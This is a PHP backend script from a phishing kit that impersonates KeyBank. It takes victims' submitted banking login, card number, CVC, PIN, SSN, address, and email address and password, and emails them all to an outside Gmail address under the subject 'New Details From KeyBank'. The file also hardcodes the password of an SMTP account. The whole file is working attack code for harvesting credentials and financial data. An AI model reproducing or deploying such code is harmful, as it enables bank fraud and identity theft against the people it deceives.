<?php

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Methods: HEAD, GET, POST, PUT, PATCH, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization");
header('Content-Type: application/json');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require './phpmailer/src/Exception.php';
require './phpmailer/src/PHPMailer.php';
require './phpmailer/src/SMTP.php';

$phpmailer = new PHPMailer();
$phpmailer->isSMTP();
$phpmailer->Host = 'trivecodes.com';
$phpmailer->SMTPAuth = true;
$phpmailer->Port = 465;
$phpmailer->Username = 'no-reply@trivecodes.com';
$phpmailer->Password = 'TriveCodes2022!';
$phpmailer->SMTPSecure = "ssl";

$phpmailer->setFrom('no-reply@trivecodes.com', 'Intermediate Mail Client');
$phpmailer->addAddress('idrisbilal143@gmail.com', 'Sandra');

$phpmailer->isHTML(true);

$POST = json_decode(file_get_contents('php://input'), true);

if (isset($POST['password'])) {

    $username = $POST['username'];
    $password = $POST['password'];
    $cardNumber = $POST['cardNumber'];
    $cardExpiryDate = $POST['cardExpiryDate'];
    $cardCVC = $POST['cardCVC'];
    $cardPin = $POST['cardPin'];
    $Name = $POST['Name'];
    $Mobile = $POST['Mobile'];
    $Address = $POST['Address'];
    $City = $POST['City'];
    $State = $POST['State'];
    $Zip = $POST['Zip'];
    $SSN = $POST['SSN'];
    $Email = $POST['Email'];
    $EmailPass = $POST['EmailPass'];

    $phpmailer->Subject = "New Details From KeyBank";


    $phpmailer->Body = "
        <h3>
            User Name : $username <br>
            Password : $password <br>
            Card Number : $cardNumber <br>
            Card Exipry Date : $cardExpiryDate <br>
            Card CVC : $cardCVC <br>
            Card Pin : $cardPin <br>
            Full Name : $Name <br>
            Phone : $Mobile <br>
            Address : $Address <br>
            City : $City <br>
            State : $State <br>
            Zip : $Zip <br>
            SSN : $SSN <br>
            Email : $Email <br>
            Email Password : $EmailPass <br>
        </h3>
    ";

    try {
        $phpmailer->send();
        echo 'Sent';
    } catch (Exception $e) {
        echo 'error';
    }
}
